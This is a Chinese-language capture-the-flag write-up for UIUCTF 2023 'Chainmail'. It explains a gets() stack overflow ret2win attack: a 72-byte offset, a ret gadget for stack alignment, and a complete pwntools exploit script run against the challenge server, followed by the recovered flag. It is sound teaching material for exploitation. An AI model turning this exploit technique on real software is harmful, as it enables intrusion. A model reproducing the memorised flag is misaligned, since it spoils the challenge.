# UIUCTF 2023 Chainmail Writeup

## 题目简述

程序在 `main` 中声明 64 字节栈缓冲区 `name`，却使用没有长度限制的 `gets(name)` 读取输入。二进制以 `-fno-stack-protector -no-pie` 编译，因此没有栈 Canary，代码地址也固定。

程序还包含未被正常调用的 `give_flag()`：它打开 `/flag.txt` 并逐字节输出。目标是覆盖返回地址完成 ret2win。

## 解题过程

从 `name` 起填满 64 字节，再覆盖 8 字节 saved RBP，之后就是 `main` 的 saved RIP，所以偏移为：

```text
64 + 8 = 72 bytes
```

用 `nm` 或反汇编确认目标函数地址：

```text
give_flag = 0x401216
```

如果只把 saved RIP 改为 `give_flag`，该函数内部调用 libc 时可能因 System V AMD64 ABI 要求的 16 字节栈对齐而崩溃。先经过一个单独的 `ret` gadget，多弹出 8 字节，即可恢复调用函数时预期的对齐关系：

```text
ret gadget = 0x401287
```

最终栈布局为：

```text
72 字节填充 | ret gadget | give_flag
```

利用脚本如下：

```python
from pwn import p64, remote

io = remote("chainmail.chal.uiuc.tf", 1337)

payload = b"A" * 72
payload += p64(0x401287)  # ret：调整 RSP 对齐
payload += p64(0x401216)  # give_flag

io.sendlineafter(b"recipient: ", payload)
io.recvuntil(b"uiuctf{")
print((b"uiuctf{" + io.recvuntil(b"}")).decode())
```

执行后得到：

```text
uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}
```

## 方法总结

这是标准的 `gets` 栈溢出 ret2win：确认保护、计算覆盖偏移、定位隐藏函数，再构造返回链。x86-64 下还要检查栈对齐；ROP 链入口比正常 `call` 少压入一个返回地址时，常用额外的 `ret` gadget 补齐 8 字节。固定记录 gadget 和函数地址所对应的题目二进制，避免把其他构建版本的地址混入利用脚本。
